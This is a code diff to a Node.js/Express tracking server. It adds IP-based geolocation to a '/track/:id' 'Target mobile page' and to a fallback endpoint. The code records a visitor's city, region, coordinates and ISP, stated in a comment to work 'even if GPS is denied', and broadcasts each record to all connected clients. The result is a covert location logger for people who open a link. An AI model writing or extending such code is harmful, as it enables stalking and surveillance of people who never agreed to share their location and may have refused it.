@@ -28,6 +28,57 @@ function saveDB() {
   fs.writeFileSync(DB_FILE, JSON.stringify(database, null, 2));
 }
 
+// Auto IP Geo-Location Resolver (Captures city/state even if GPS is denied)
+async function resolveAndRecordIp(sessionId, clientIp) {
+  if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp.startsWith('192.168.') || clientIp.startsWith('10.')) return;
+  
+  const existing = database.locations[sessionId] || [];
+  if (existing.length > 0 && existing.some(p => p.accuracy && p.accuracy < 500)) {
+    return; // Already have high-precision GPS, skip coarse IP
+  }
+
+  try {
+    const cleanIp = clientIp.replace(/^::ffff:/, '');
+    const res = await fetch(`https://ipwho.is/${cleanIp}`);
+    const data = await res.json();
+    if (data && data.success && data.latitude && data.longitude) {
+      const now = Date.now();
+      const payload = {
+        sessionId,
+        latitude: parseFloat(data.latitude),
+        longitude: parseFloat(data.longitude),
+        accuracy: 2500, // Coarse IP approximate radius
+        speed: 0,
+        heading: 0,
+        battery: 100,
+        city: data.city || '',
+        region: data.region || '',
+        isp: (data.connection && data.connection.isp) || '',
+        isIpEstimate: true,
+        timestamp: now
+      };
+
+      if (!database.sessions[sessionId]) {
+        database.sessions[sessionId] = {
+          sessionId,
+          label: `${data.city || 'Target'} (IP)`,
+          createdAt: now
+        };
+        database.locations[sessionId] = [];
+      }
+
+      database.locations[sessionId].push(payload);
+      saveDB();
+
+      io.to(sessionId).emit('location_update', payload);
+      io.emit('location_update', payload);
+      console.log(`[Auto IP Geo] Session: ${sessionId} -> ${data.city}, ${data.region} (${data.latitude}, ${data.longitude})`);
+    }
+  } catch (err) {
+    console.error('IP geo lookup failed:', err.message);
+  }
+}
+
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -130,11 +181,25 @@ io.on('connection', (socket) => {
   });
 });
 
+// Fallback endpoint for client-triggered IP lookup
+app.post('/api/ip-fallback/:id', (req, res) => {
+  const sessionId = req.params.id;
+  const forwarded = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'];
+  const clientIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
+  resolveAndRecordIp(sessionId, clientIp);
+  res.json({ status: 'resolving_ip' });
+});
+
 // Target mobile page
 app.get('/track/:id', (req, res) => {
+  const sessionId = req.params.id;
+  const forwarded = req.headers['x-forwarded-for'] || req.headers['cf-connecting-ip'];
+  const clientIp = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
+  resolveAndRecordIp(sessionId, clientIp);
+
   const trackPath = path.join(__dirname, 'public', 'track.html');
   let html = fs.readFileSync(trackPath, 'utf-8');
-  html = html.replace(/{{SESSION_ID}}/g, req.params.id);
+  html = html.replace(/{{SESSION_ID}}/g, sessionId);
   res.send(html);
 });
 
